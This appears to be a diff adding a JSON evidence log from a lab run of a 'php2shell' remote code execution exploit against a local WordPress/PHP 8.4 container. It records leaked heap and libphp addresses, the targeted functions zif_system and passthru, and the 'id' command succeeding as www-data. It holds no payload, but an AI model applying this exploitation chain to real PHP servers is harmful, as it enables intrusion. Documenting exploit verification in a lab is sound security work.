@@ -1,0 +1,235 @@
+{
+  "protocol": "php2shell-clean-terminal-evidence/v1",
+  "cross_process_ordering_clock": "unix_ns (time.time_ns)",
+  "status": "CLEAN_TERMINAL_OK",
+  "application_profile": "wordpress-7.1.3",
+  "expected_body_sha256": "0cab4b9edc46a4c17ba60cf00ebfb234eaec0abffa89e5c00bfa10aaf401b123",
+  "exploit_exit": 0,
+  "terminal_sync": {
+    "protocol": "php2shell-clean-terminal-sync/v1",
+    "session": "9c22d5ddfcb06635615d1a0fd7dae9d4",
+    "exploit_pid": 205002,
+    "timeout_seconds": 120.0,
+    "events": [
+      {
+        "sequence": 1,
+        "checkpoint": "before-rce-b",
+        "ready_file": "01-before-rce-b.ready",
+        "ack_file": "01-before-rce-b.ack",
+        "ready_unix_ns": 1792671580680981013,
+        "ready_monotonic_ns": 342180213876863,
+        "state": "acknowledged",
+        "ack_unix_ns": 1792671581461377359,
+        "ack_monotonic_ns": 342180994243013
+      },
+      {
+        "sequence": 2,
+        "checkpoint": "after-rce-b",
+        "ready_file": "02-after-rce-b.ready",
+        "ack_file": "02-after-rce-b.ack",
+        "ready_unix_ns": 1792671581584415488,
+        "ready_monotonic_ns": 342181117279258,
+        "state": "acknowledged",
+        "ack_unix_ns": 1792671582414549464,
+        "ack_monotonic_ns": 342181947414557
+      }
+    ]
+  },
+  "barrier_files": {
+    "before-rce-b": {
+      "ready_file": "01-before-rce-b.ready",
+      "ready_sha256": "6255126e9062ebd86af941943389a3db0429fc0a52ef0716c96bb495e4727101",
+      "ack_file": "01-before-rce-b.ack",
+      "ack_sha256": "6255126e9062ebd86af941943389a3db0429fc0a52ef0716c96bb495e4727101",
+      "byte_identical": true
+    },
+    "after-rce-b": {
+      "ready_file": "02-after-rce-b.ready",
+      "ready_sha256": "e41a6b7c31d34aa2e814b646826cbd0bd88bfc931f66c7fcdfbf177ef447c8d4",
+      "ack_file": "02-after-rce-b.ack",
+      "ack_sha256": "e41a6b7c31d34aa2e814b646826cbd0bd88bfc931f66c7fcdfbf177ef447c8d4",
+      "byte_identical": true
+    }
+  },
+  "snapshots": {
+    "before_rce_b": {
+      "label": "before-rce-b",
+      "capture_started_unix_ns": 1792671580829631782,
+      "capture_started_at": "2026-10-22T12:19:40.829632Z",
+      "capture_completed_unix_ns": 1792671581386487234,
+      "capture_completed_at": "2026-10-22T12:19:41.386487Z",
+      "capture_started_monotonic_ns": 342180362506092,
+      "capture_completed_monotonic_ns": 342180919350593,
+      "container": {
+        "id": "df9b4514923f505f3a3d0b924f59d2d50ede7ca91368dd4288eb1239a2ed2e49",
+        "started_at": "2026-10-22T12:19:14.845504999Z",
+        "restart_count": 0,
+        "running": true,
+        "init_pid": 204398
+      },
+      "worker": {
+        "source": {
+          "docker_top_pid": "docker top -eo pid,user,comm",
+          "namespace_identity": "docker exec target; UID 33 apache2; /proc/PID/stat field 22"
+        },
+        "docker_top_count": 1,
+        "docker_top_pid": 205262,
+        "all_docker_top_pids": [
+          205262
+        ],
+        "namespace_count": 1,
+        "namespace_pid": 150,
+        "namespace_start_time_ticks": 34217960
+      },
+      "error_log": {
+        "source": "docker exec target; stat/wc/sha256sum",
+        "path": "/tmp/php2shell-apache-error.log",
+        "present": true,
+        "size": 3435,
+        "sha256": "16e96db360d6df413df67c694a242c08de421732ecfe3b1796512a84d6024833",
+        "device": 115,
+        "inode": 3,
+        "snapshot_stable": true
+      },
+      "capture_errors": []
+    },
+    "after_rce_b": {
+      "label": "after-rce-b",
+      "capture_started_unix_ns": 1792671581760917459,
+      "capture_started_at": "2026-10-22T12:19:41.760917Z",
+      "capture_completed_unix_ns": 1792671582375837450,
+      "capture_completed_at": "2026-10-22T12:19:42.375838Z",
+      "capture_started_monotonic_ns": 342181293793092,
+      "capture_completed_monotonic_ns": 342181908701080,
+      "container": {
+        "id": "df9b4514923f505f3a3d0b924f59d2d50ede7ca91368dd4288eb1239a2ed2e49",
+        "started_at": "2026-10-22T12:19:14.845504999Z",
+        "restart_count": 0,
+        "running": true,
+        "init_pid": 204398
+      },
+      "worker": {
+        "source": {
+          "docker_top_pid": "docker top -eo pid,user,comm",
+          "namespace_identity": "docker exec target; UID 33 apache2; /proc/PID/stat field 22"
+        },
+        "docker_top_count": 1,
+        "docker_top_pid": 205262,
+        "all_docker_top_pids": [
+          205262
+        ],
+        "namespace_count": 1,
+        "namespace_pid": 150,
+        "namespace_start_time_ticks": 34217960
+      },
+      "error_log": {
+        "source": "docker exec target; stat/wc/sha256sum",
+        "path": "/tmp/php2shell-apache-error.log",
+        "present": true,
+        "size": 3435,
+        "sha256": "16e96db360d6df413df67c694a242c08de421732ecfe3b1796512a84d6024833",
+        "device": 115,
+        "inode": 3,
+        "snapshot_stable": true
+      },
+      "capture_errors": []
+    },
+    "after_get": {
+      "label": "after-get",
+      "capture_started_unix_ns": 1792671582684367902,
+      "capture_started_at": "2026-10-22T12:19:42.684368Z",
+      "capture_completed_unix_ns": 1792671583459987813,
+      "capture_completed_at": "2026-10-22T12:19:43.459988Z",
+      "capture_started_monotonic_ns": 342182217244617,
+      "capture_completed_monotonic_ns": 342182992851594,
+      "container": {
+        "id": "df9b4514923f505f3a3d0b924f59d2d50ede7ca91368dd4288eb1239a2ed2e49",
+        "started_at": "2026-10-22T12:19:14.845504999Z",
+        "restart_count": 0,
+        "running": true,
+        "init_pid": 204398
+      },
+      "worker": {
+        "source": {
+          "docker_top_pid": "docker top -eo pid,user,comm",
+          "namespace_identity": "docker exec target; UID 33 apache2; /proc/PID/stat field 22"
+        },
+        "docker_top_count": 1,
+        "docker_top_pid": 205262,
+        "all_docker_top_pids": [
+          205262
+        ],
+        "namespace_count": 1,
+        "namespace_pid": 150,
+        "namespace_start_time_ticks": 34217960
+      },
+      "error_log": {
+        "source": "docker exec target; stat/wc/sha256sum",
+        "path": "/tmp/php2shell-apache-error.log",
+        "present": true,
+        "size": 3435,
+        "sha256": "16e96db360d6df413df67c694a242c08de421732ecfe3b1796512a84d6024833",
+        "device": 115,
+        "inode": 3,
+        "snapshot_stable": true
+      },
+      "capture_errors": []
+    }
+  },
+  "follow_up_get": {
+    "url": "http://127.0.0.1:9091/index.php",
+    "host_header": "127.0.0.1:8088",
+    "application_profile": "wordpress-7.1.3",
+    "expected_body_sha256": "0cab4b9edc46a4c17ba60cf00ebfb234eaec0abffa89e5c00bfa10aaf401b123",
+    "curl_exit": 0,
+    "http_status": "200",
+    "started_unix_ns": 1792671582478950669,
+    "started_at": "2026-10-22T12:19:42.478951Z",
+    "completed_unix_ns": 1792671582579550874,
+    "completed_at": "2026-10-22T12:19:42.579551Z",
+    "started_monotonic_ns": 342182011825490,
+    "completed_monotonic_ns": 342182112424783,
+    "headers_bytes": 255,
+    "headers_sha256": "2a49b6bb3da08fcf78b593e73a07c51f4db9d3acd493988159667f2179fe5510",
+    "body_bytes": 60,
+    "body_sha256": "0cab4b9edc46a4c17ba60cf00ebfb234eaec0abffa89e5c00bfa10aaf401b123",
+    "curl_stderr_bytes": 0,
+    "curl_stderr_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  },
+  "result": {
+    "profile": "php-8.4.26-amd64",
+    "address_source_1": "heap-b HTTP Set-Cookie",
+    "address_source_2": "libphp-b HTTP Set-Cookie",
+    "cached_heap": "0x7cf4abe00000",
+    "main_heap": "0x7cf4ac200000",
+    "safe_basedir": "0x7cf4ac255030",
+    "pDestructor": "0x7cf4acb4ab60",
+    "libphp_base": "0x7cf4ac4fc000",
+    "htdata": "0x7cf4ac2690d8",
+    "zif_system": "0x7cf4ac9563b0",
+    "zif_passthru": "0x7cf4ac9563c0",
+    "terminal_dispatch": "0x7cf4ac9e1799",
+    "zend_bailout": "0x7cf4ac6a5936",
+    "terminal": "two-callback passthru/bailout",
+    "terminal_http_status": 200,
+    "http_body_complete": true,
+    "command": "id",
+    "status": "RCE_OUTPUT_OBSERVED",
+    "command_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
+    "command_output_bytes": 54,
+    "command_output_sha256": "6d99797c5e70f1676baffdaab9979d52aef4d97cb7c457054182abe6e4075c1e",
+    "command_output_source": "rce-b HTTP body"
+  },
+  "command_output_artifact": {
+    "bytes": 54,
+    "sha256": "6d99797c5e70f1676baffdaab9979d52aef4d97cb7c457054182abe6e4075c1e"
+  },
+  "invariants": {
+    "same_container": true,
+    "same_worker_docker_top_pid_namespace_pid_and_start_time": true,
+    "same_error_log_identity_size_and_sha256": true,
+    "snapshots_enclosed_by_barriers": true,
+    "follow_up_http_200": true
+  },
+  "errors": []
+}
